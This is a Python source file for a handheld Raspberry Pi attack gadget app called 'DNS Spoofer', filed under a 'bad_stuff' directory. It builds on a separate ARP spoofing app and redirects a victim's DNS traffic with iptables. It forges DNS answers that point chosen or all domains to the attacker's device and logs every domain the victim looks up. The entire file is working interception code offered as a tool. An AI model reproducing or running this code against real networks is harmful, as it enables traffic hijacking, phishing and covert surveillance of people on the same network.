"""
apps/bad_stuff/network/dns_spoofer/app.py
DNS Spoofer — intercept DNS queries and return fake IPs.

Requires ARP Spoofer to be running (MitM position).

How it works:
  1. iptables redirects UDP :53 from victim → our port 5353
  2. We receive DNS queries, check against rules list
  3. Matched domains → return our IP (Pi's IP)
  4. Unmatched → forward to real DNS and relay response
  5. All queries logged to disk

Screens:
  IDLE   — check ARP Spoofer status, show instructions
  RULES  — manage spoof rules (domain → our IP)
  LIVE   — real-time DNS query log

Background mode:
  KEY3 on LIVE screen → keeps running in background

Saves logs to:
  /home/mark/pi-gadget/menu_fs/02_files/dns_spoof/
  Filename: dns_<timestamp>.log

Controls:
  IDLE:
    CENTER  — start (requires ARP Spoofer active)
    KEY1    — go to rules
    KEY3    — exit

  RULES:
    UP/DOWN — scroll rules
    KEY1    — add rule (spoof ALL domains → our IP)
    KEY2    — toggle selected rule on/off
    KEY3    — back

  LIVE:
    UP/DOWN — scroll log
    KEY1    — clear log
    KEY3    — background
"""

import os
import socket
import struct
import threading
import time
import datetime
import subprocess
from PIL import Image, ImageDraw
from core.background import bgm

# ── Paths ─────────────────────────────────────────────────────
BASE_DIR = os.path.dirname(
    os.path.dirname(
        os.path.dirname(
            os.path.dirname(
                os.path.dirname(os.path.abspath(__file__))
            )
        )
    )
)
LOG_DIR = os.path.join(BASE_DIR, "menu_fs", "02_files", "dns_spoof")

APP_NAME  = "DNS Spoofer"
RESOURCES = ["dns_port_53"]

LISTEN_PORT  = 5353       # local port we bind to
REAL_DNS     = "8.8.8.8"  # upstream DNS for non-spoofed queries
DNS_TIMEOUT  = 3.0        # seconds to wait for upstream response
MAX_LOG_ROWS = 200        # keep last N entries in memory

# ── Layout ────────────────────────────────────────────────────
TOP_H = 26
BOT_H = 18
ROW_H = 22

# ── Palette ───────────────────────────────────────────────────
BG     = (4,   8,   16)
HDR_BG = (8,   14,  28)
SEL_BG = (12,  25,  50)
SEP    = (25,  45,  75)
SEP_HI = (50,  90,  140)
WHITE  = (220, 235, 255)
DIM    = (70,  100, 140)
HINT   = (50,  75,  110)
CYAN   = (0,   210, 255)
GREEN  = (50,  220, 120)
YELLOW = (255, 200, 50)
RED    = (255, 70,  70)
ORANGE = (255, 140, 30)
PURPLE = (160, 80,  255)


# ── Shell helper ──────────────────────────────────────────────

def _sh(cmd, timeout=10):
    try:
        r = subprocess.run(
            cmd, capture_output=True, timeout=timeout,
            shell=isinstance(cmd, str)
        )
        return r.returncode, (r.stdout + r.stderr).decode("utf-8", errors="ignore")
    except Exception as e:
        return 1, str(e)


def _get_own_ip() -> str:
    """Return Pi's IP on the default interface."""
    _, out = _sh(["ip", "route", "get", "1.1.1.1"])
    for part in out.split():
        if part.count(".") == 3 and part != "1.1.1.1":
            try:
                socket.inet_aton(part)
                return part
            except Exception:
                pass
    return ""


def _arp_spoofer_active() -> bool:
    """Check if ARP Spoofer is registered in bgm._tasks."""
    return bool(bgm.get_task_info("ARP Spoofer"))


# ── iptables helpers ──────────────────────────────────────────

def _add_iptables(victim_ip: str):
    """Redirect victim's DNS (UDP 53) to our LISTEN_PORT."""
    _sh([
        "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
        "-s", victim_ip,
        "-p", "udp", "--dport", "53",
        "-j", "REDIRECT", "--to-port", str(LISTEN_PORT),
    ])


def _del_iptables(victim_ip: str):
    """Remove the iptables redirect rule."""
    _sh([
        "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
        "-s", victim_ip,
        "-p", "udp", "--dport", "53",
        "-j", "REDIRECT", "--to-port", str(LISTEN_PORT),
    ])


# ── DNS packet helpers ────────────────────────────────────────

def _parse_dns_name(data: bytes, offset: int):
    """
    Parse a DNS name from wire format.
    Returns (name_string, new_offset).
    Handles compression pointers.
    """
    labels = []
    visited = set()
    while offset < len(data):
        if offset in visited:
            break
        visited.add(offset)
        length = data[offset]
        if length == 0:
            offset += 1
            break
        elif (length & 0xC0) == 0xC0:
            # Compression pointer
            if offset + 1 >= len(data):
                break
            ptr = ((length & 0x3F) << 8) | data[offset + 1]
            offset += 2
            sub, _ = _parse_dns_name(data, ptr)
            labels.append(sub)
            break
        else:
            offset += 1
            if offset + length > len(data):
                break
            labels.append(data[offset:offset + length].decode("utf-8", errors="replace"))
            offset += length
    return ".".join(labels), offset


def _parse_dns_query(data: bytes):
    """
    Parse DNS query packet.
    Returns (transaction_id, qname, qtype) or None on error.
    """
    try:
        if len(data) < 12:
            return None
        tid   = struct.unpack("!H", data[0:2])[0]
        flags = struct.unpack("!H", data[2:4])[0]
        # QR bit: 0 = query, 1 = response
        if (flags >> 15) & 1:
            return None
        qcount = struct.unpack("!H", data[4:6])[0]
        if qcount == 0:
            return None
        qname, offset = _parse_dns_name(data, 12)
        if offset + 4 > len(data):
            return None
        qtype  = struct.unpack("!H", data[offset:offset + 2])[0]
        return tid, qname, qtype
    except Exception:
        return None


def _build_spoof_response(query_data: bytes, qname: str, spoof_ip: str) -> bytes:
    """
    Build a DNS A-record response pointing qname → spoof_ip.
    """
    try:
        tid   = query_data[0:2]
        flags = b'\x81\x80'   # QR=1, AA=0, RD=1, RA=1, RCODE=0
        qdcount = b'\x00\x01'
        ancount = b'\x00\x01'
        nscount = b'\x00\x00'
        arcount = b'\x00\x00'
        header  = tid + flags + qdcount + ancount + nscount + arcount

        # Copy original question section (everything after the 12-byte header)
        _, q_end = _parse_dns_name(query_data, 12)
        question = query_data[12: q_end + 4]   # name + qtype + qclass

        # Answer: pointer to name in question (0xC00C), type A, class IN, TTL, rdata
        answer = (
            b'\xc0\x0c'                          # pointer to qname
            + b'\x00\x01'                        # type A
            + b'\x00\x01'                        # class IN
            + b'\x00\x00\x00\x3c'               # TTL 60s
            + b'\x00\x04'                        # rdlength
            + socket.inet_aton(spoof_ip)         # rdata
        )
        return header + question + answer
    except Exception:
        return b''


def _forward_dns(query_data: bytes) -> bytes:
    """Forward DNS query to real upstream and return response."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(DNS_TIMEOUT)
        sock.sendto(query_data, (REAL_DNS, 53))
        response, _ = sock.recvfrom(4096)
        sock.close()
        return response
    except Exception:
        return b''


def _domain_matches(qname: str, rule_domain: str) -> bool:
    """
    Check if qname matches a rule.
    '*' matches everything.
    '*.example.com' matches any subdomain.
    'example.com' matches exact + subdomains.
    """
    if rule_domain == "*":
        return True
    qname = qname.rstrip(".")
    rule  = rule_domain.rstrip(".")
    if rule.startswith("*."):
        suffix = rule[2:]
        return qname.endswith("." + suffix) or qname == suffix
    return qname == rule or qname.endswith("." + rule)


# ── App ───────────────────────────────────────────────────────

class DnsSpooferApp:
    def __init__(self, hw, fonts, monitor=None):
        self.hw = hw
        self.font_big, self.font_small, self.font_label = fonts

        self.screen = "IDLE"
        self._dirty = True

        # Spoof rules: list of {"domain": str, "ip": str, "enabled": bool}
        self._rules = [
            {"domain": "*", "ip": "",    "enabled": False},  # catch-all, disabled by default
        ]
        self._rule_sel    = 0
        self._rule_scroll = 0

        # Running state
        self._running      = False
        self._stop_event   = threading.Event()
        self._server_thread = None
        self._victim_ip    = ""
        self._own_ip       = ""

        # Live log
        self._log      = []   # list of {"time", "domain", "spoofed", "client"}
        self._log_lock = threading.Lock()
        self._log_scroll = 0

        # Stats
        self._total_queries  = 0
        self._spoofed_count  = 0
        self._start_time     = 0.0

        self._status_msg = ""
        self._log_path   = ""

    # ── Lifecycle ─────────────────────────────────────────────

    def on_enter(self):
        self._dirty = True
        if self._running:
            self.screen = "LIVE"
        else:
            self.screen = "IDLE"
            # Fill own IP
            if not self._own_ip:
                self._own_ip = _get_own_ip()
            # Set catch-all rule IP to our IP
            if self._rules and not self._rules[0]["ip"]:
                self._rules[0]["ip"] = self._own_ip

    def on_exit(self):
        if not self._running:
            self._cleanup()

    # ── Start / Stop ──────────────────────────────────────────

    def _start(self):
        """Start DNS interception."""
        # Get victim IP from ARP Spoofer instance via bgm.get_task_info()
        arp_info = bgm.get_task_info("ARP Spoofer")
        if not arp_info:
            self._status_msg = "Start ARP Spoofer first"
            self._dirty = True
            return

        arp_instance = arp_info.get("instance")
        if arp_instance is None:
            self._status_msg = "ARP Spoofer: no instance"
            self._dirty = True
            return

        victim_host = getattr(arp_instance, "_victim_host", None)
        if not victim_host:
            self._status_msg = "ARP Spoofer: no victim"
            self._dirty = True
            return

        victim_ip = victim_host.get("ip", "")
        if not victim_ip:
            self._status_msg = "No victim IP in ARP"
            self._dirty = True
            return

        # Ensure own IP is set
        if not self._own_ip:
            self._own_ip = _get_own_ip()

        # Fill catch-all rule with own IP if empty
        for rule in self._rules:
            if not rule["ip"]:
                rule["ip"] = self._own_ip

        self._victim_ip  = victim_ip
        self._start_time = time.time()
        self._total_queries = 0
        self._spoofed_count = 0
        self._status_msg = "Starting..."
        self._running    = True
        self._stop_event.clear()
        self.screen      = "LIVE"
        self._dirty      = True

        # Prepare log file
        os.makedirs(LOG_DIR, exist_ok=True)
        ts = time.strftime("%Y%m%d_%H%M%S")
        self._log_path = os.path.join(LOG_DIR, f"dns_{ts}.log")

        bgm.register(APP_NAME, RESOURCES, self._stop_nowait,
                     instance=self, module="bad_stuff.network.dns_spoofer")

        # Add iptables rule
        _add_iptables(victim_ip)

        # Start server thread
        self._server_thread = threading.Thread(
            target=self._server_loop, daemon=True
        )
        self._server_thread.start()

    def _stop_nowait(self):
        """Stop without blocking — safe for bgm callbacks."""
        self._stop_event.set()

    def _stop_and_cleanup(self):
        """Stop server and remove iptables rule. Blocks up to 3s."""
        self._stop_event.set()
        if self._server_thread:
            self._server_thread.join(timeout=3)
        self._cleanup()

    def _cleanup(self):
        """Remove iptables rules and unregister bgm."""
        if self._victim_ip:
            _del_iptables(self._victim_ip)
            self._victim_ip = ""
        self._running = False
        bgm.unregister(APP_NAME)
        self._dirty = True

    # ── DNS server loop ───────────────────────────────────────

    def _server_loop(self):
        """
        UDP server that handles DNS queries from the victim.
        Runs in daemon thread, survives background navigation.
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", LISTEN_PORT))
            sock.settimeout(1.0)
            self._status_msg = "Intercepting DNS..."
            self._dirty = True

            while not self._stop_event.is_set():
                try:
                    data, addr = sock.recvfrom(4096)
                except socket.timeout:
                    continue

                # Handle each query in its own thread to avoid blocking
                threading.Thread(
                    target=self._handle_query,
                    args=(sock, data, addr),
                    daemon=True
                ).start()

            sock.close()

        except PermissionError:
            self._status_msg = "Permission denied on :5353"
        except Exception as e:
            self._status_msg = str(e)[:28]
        finally:
            self._cleanup()

    def _handle_query(self, sock, data: bytes, addr):
        """Process a single DNS query: spoof or forward."""
        parsed = _parse_dns_query(data)
        if not parsed:
            return

        _, qname, qtype = parsed
        domain = qname.rstrip(".")

        # Check enabled rules
        spoofed    = False
        spoof_ip   = ""
        for rule in self._rules:
            if rule["enabled"] and rule["ip"] and _domain_matches(domain, rule["domain"]):
                spoof_ip = rule["ip"]
                spoofed  = True
                break

        if spoofed and qtype == 1:  # type A only
            response = _build_spoof_response(data, domain, spoof_ip)
        else:
            response = _forward_dns(data)

        if response:
            try:
                sock.sendto(response, addr)
            except Exception:
                pass

        # Log entry
        self._total_queries += 1
        if spoofed:
            self._spoofed_count += 1

        entry = {
            "time":    time.strftime("%H:%M:%S"),
            "domain":  domain,
            "spoofed": spoofed,
            "spoof_ip": spoof_ip if spoofed else "",
            "client":  addr[0],
        }

        with self._log_lock:
            self._log.append(entry)
            if len(self._log) > MAX_LOG_ROWS:
                self._log.pop(0)

        # Write to log file
        try:
            with open(self._log_path, "a") as f:
                mark = "SPOOF" if spoofed else "fwd  "
                f.write(f"{entry['time']}  {mark}  {domain:<40}  {spoof_ip}\n")
        except Exception:
            pass

        self._dirty = True

    # ── Events ────────────────────────────────────────────────

    def on_event(self, event) -> str:
        if self.screen == "IDLE":
            if event == "KEY3":
                return "exit"
            if event == "KEY1":
                self.screen = "RULES"
                self._dirty = True
            if event == "CENTER":
                if _arp_spoofer_active():
                    self._start()
                else:
                    self._status_msg = "Start ARP Spoofer first"
                    self._dirty = True
                    return "stay"

        elif self.screen == "RULES":
            n = len(self._rules)
            if event == "KEY3":
                self.screen = "IDLE"
                self._dirty = True
            elif event == "UP" and self._rule_sel > 0:
                self._rule_sel -= 1
                self._fix_rule_scroll()
                self._dirty = True
            elif event == "DOWN" and self._rule_sel < n - 1:
                self._rule_sel += 1
                self._fix_rule_scroll()
                self._dirty = True
            elif event == "KEY2" and n > 0:
                # Toggle selected rule enabled/disabled
                self._rules[self._rule_sel]["enabled"] = \
                    not self._rules[self._rule_sel]["enabled"]
                self._dirty = True
            elif event == "KEY1":
                # Add a new catch-all rule
                self._rules.append({
                    "domain":  "*",
                    "ip":      self._own_ip,
                    "enabled": True,
                })
                self._rule_sel = len(self._rules) - 1
                self._fix_rule_scroll()
                self._dirty = True

        elif self.screen == "LIVE":
            if event == "KEY3":
                return "background"
            if event == "KEY1":
                # Stop and go back to IDLE
                self._stop_and_cleanup()
                self.screen = "IDLE"
                self._dirty = True
            with self._log_lock:
                log_len = len(self._log)
            max_r = self._max_log_rows()
            if event == "UP" and self._log_scroll > 0:
                self._log_scroll -= 1
                self._dirty = True
            if event == "DOWN" and self._log_scroll < max(0, log_len - max_r):
                self._log_scroll += 1
                self._dirty = True

        return "stay"

    def _max_rule_rows(self) -> int:
        return (self.hw.H - TOP_H - BOT_H) // ROW_H

    def _fix_rule_scroll(self):
        max_r = self._max_rule_rows()
        if self._rule_sel < self._rule_scroll:
            self._rule_scroll = self._rule_sel
        elif self._rule_sel >= self._rule_scroll + max_r:
            self._rule_scroll = self._rule_sel - max_r + 1

    def _max_log_rows(self) -> int:
        return (self.hw.H - TOP_H - BOT_H - 30) // ROW_H

    # ── Update ────────────────────────────────────────────────

    def update(self, dt):
        if self._running:
            self._dirty = True

    # ── Draw ──────────────────────────────────────────────────

    def draw(self):
        if not self._dirty:
            return
        self._dirty = False

        W, H = self.hw.W, self.hw.H
        img  = Image.new("RGB", (W, H), BG)
        d    = ImageDraw.Draw(img)

        self._draw_header(d, W)

        if self.screen == "IDLE":
            self._draw_idle(d, W, H, TOP_H)
        elif self.screen == "RULES":
            self._draw_rules(d, W, H, TOP_H)
        elif self.screen == "LIVE":
            self._draw_live(d, W, H, TOP_H)

        self._draw_bottom(d, W, H)
        self.hw.show(img)

    # ── Header ────────────────────────────────────────────────

    def _draw_header(self, d, W):
        d.rectangle([(0, 0), (W, TOP_H)], fill=HDR_BG)
        d.rectangle([(0, 0), (3, TOP_H)], fill=PURPLE)
        d.text((10, (TOP_H - self.font_label.size) // 2),
               "DNS SPOOFER", font=self.font_label, fill=PURPLE)

        if self._running:
            badge, col = "■ LIVE", RED
        else:
            badge, col = "● READY", GREEN

        bw, bh = self._ts(d, badge, self.font_label)
        d.text((W - bw - 6, (TOP_H - bh) // 2),
               badge, font=self.font_label, fill=col)
        d.line([(0, TOP_H), (W, TOP_H)], fill=SEP_HI, width=1)

    # ── IDLE screen ───────────────────────────────────────────

    def _draw_idle(self, d, W, H, y0):
        M  = 10
        lh = self.font_label.size + 8
        y  = y0 + 10

        # ARP Spoofer status
        arp_ok = _arp_spoofer_active()
        arp_txt = "ARP Spoofer: ACTIVE" if arp_ok else "ARP Spoofer: OFFLINE"
        arp_col = GREEN if arp_ok else RED
        aw, _ = self._ts(d, arp_txt, self.font_label)
        d.text(((W - aw) // 2, y), arp_txt, font=self.font_label, fill=arp_col)
        y += lh

        # Own IP
        ip_txt = f"Our IP: {self._own_ip or '?'}"
        iw, _ = self._ts(d, ip_txt, self.font_label)
        d.text(((W - iw) // 2, y), ip_txt, font=self.font_label, fill=CYAN)
        y += lh + 4

        d.line([(M, y), (W - M, y)], fill=SEP, width=1)
        y += 8

        # Rules summary
        enabled = sum(1 for r in self._rules if r["enabled"])
        rtxt = f"{len(self._rules)} rules  ({enabled} active)"
        rw, _ = self._ts(d, rtxt, self.font_label)
        d.text(((W - rw) // 2, y), rtxt, font=self.font_label, fill=YELLOW)
        y += lh

        # Status msg
        if self._status_msg:
            sw, _ = self._ts(d, self._status_msg, self.font_label)
            d.text(((W - sw) // 2, y + 4),
                   self._status_msg, font=self.font_label,
                   fill=RED if "first" in self._status_msg else DIM)

    # ── RULES screen ──────────────────────────────────────────

    def _draw_rules(self, d, W, H, y0):
        max_r   = self._max_rule_rows()
        visible = self._rules[self._rule_scroll: self._rule_scroll + max_r]
        y       = y0

        for i, rule in enumerate(visible):
            idx    = self._rule_scroll + i
            is_sel = idx == self._rule_sel
            y1r    = y + ROW_H

            if is_sel:
                d.rectangle([(0, y), (W, y1r - 1)], fill=SEL_BG)
                d.rectangle([(0, y), (2, y1r - 1)], fill=PURPLE)

            # Enable dot
            dot_col = GREEN if rule["enabled"] else DIM
            d.text((6, y + (ROW_H - self.font_label.size) // 2),
                   "●", font=self.font_label, fill=dot_col)

            # Domain
            dom = self._trunc(d, rule["domain"], self.font_label, 110)
            d.text((20, y + (ROW_H - self.font_label.size) // 2),
                   dom, font=self.font_label,
                   fill=WHITE if is_sel else DIM)

            # Arrow + IP
            arrow = "→"
            aw, _ = self._ts(d, arrow, self.font_label)
            d.text((134, y + (ROW_H - self.font_label.size) // 2),
                   arrow, font=self.font_label, fill=HINT)

            ip_str = rule["ip"] or "our IP"
            iw, _ = self._ts(d, ip_str, self.font_label)
            d.text((W - iw - 4, y + (ROW_H - self.font_label.size) // 2),
                   ip_str, font=self.font_label, fill=CYAN if is_sel else DIM)

            d.line([(0, y1r - 1), (W, y1r - 1)], fill=SEP, width=1)
            y += ROW_H

        # Scrollbar
        total = len(self._rules)
        if total > max_r:
            area_h = H - BOT_H - y0
            bar_h  = max(10, int(area_h * max_r / total))
            bar_y  = y0 + int(
                (area_h - bar_h) * self._rule_scroll / max(1, total - max_r)
            )
            d.rectangle([W - 3, bar_y, W - 1, bar_y + bar_h], fill=DIM)

    # ── LIVE screen ───────────────────────────────────────────

    def _draw_live(self, d, W, H, y0):
        M  = 6
        lh = self.font_label.size + 7
        y  = y0 + 4

        # Stats bar
        elapsed  = int(time.time() - self._start_time)
        mins, secs = elapsed // 60, elapsed % 60
        stats = f"Q:{self._total_queries}  SPOOF:{self._spoofed_count}  {mins:02d}:{secs:02d}"
        sw, sh = self._ts(d, stats, self.font_label)
        d.text(((W - sw) // 2, y), stats, font=self.font_label, fill=CYAN)
        y += sh + 4
        d.line([(M, y), (W - M, y)], fill=SEP, width=1)
        y += 4

        # Log rows
        with self._log_lock:
            log_copy = list(self._log)

        # Auto-scroll to bottom unless user scrolled up
        max_r = (H - BOT_H - y) // lh
        if self._log_scroll == 0:
            # Show most recent entries at bottom
            visible = log_copy[-(max_r):]
        else:
            start = max(0, len(log_copy) - max_r - self._log_scroll)
            visible = log_copy[start: start + max_r]

        for entry in visible:
            spoofed = entry["spoofed"]
            col     = RED if spoofed else DIM
            mark    = "✗" if spoofed else "·"

            # Time + mark
            tm = entry["time"]
            prefix = f"{tm} {mark} "
            pw, _ = self._ts(d, prefix, self.font_label)
            d.text((M, y), prefix, font=self.font_label, fill=col)

            # Domain
            avail = W - M * 2 - pw
            dom   = self._trunc(d, entry["domain"], self.font_label, avail)
            d.text((M + pw, y), dom, font=self.font_label,
                   fill=ORANGE if spoofed else WHITE)

            y += lh
            if y + lh > H - BOT_H:
                break

        # Victim IP
        if self._victim_ip:
            vt = f"victim: {self._victim_ip}"
            vw, vh = self._ts(d, vt, self.font_label)
            d.text(((W - vw) // 2, H - BOT_H - vh - 20),
                   vt, font=self.font_label, fill=(30, 50, 80))

    # ── Bottom hint ───────────────────────────────────────────

    def _draw_bottom(self, d, W, H):
        d.line([(0, H - BOT_H), (W, H - BOT_H)], fill=SEP, width=1)
        hints = {
            "IDLE":  "CTR:start  K1:rules  K3:exit",
            "RULES": "K1:add  K2:toggle  K3:back",
            "LIVE":  "K1:stop  K3:background",
        }
        hint = self._trunc(d, hints.get(self.screen, ""), self.font_label, W - 4)
        hw2, hh = self._ts(d, hint, self.font_label)
        d.text(((W - hw2) // 2, H - hh - 2),
               hint, font=self.font_label, fill=HINT)

    # ── Helpers ───────────────────────────────────────────────

    def _ts(self, d, text, font):
        b = d.textbbox((0, 0), text, font=font)
        return b[2] - b[0], b[3] - b[1]

    def _trunc(self, d, text, font, max_w):
        while text:
            w, _ = self._ts(d, text, font)
            if w <= max_w:
                return text
            text = text[:-2] + "…"
        return ""
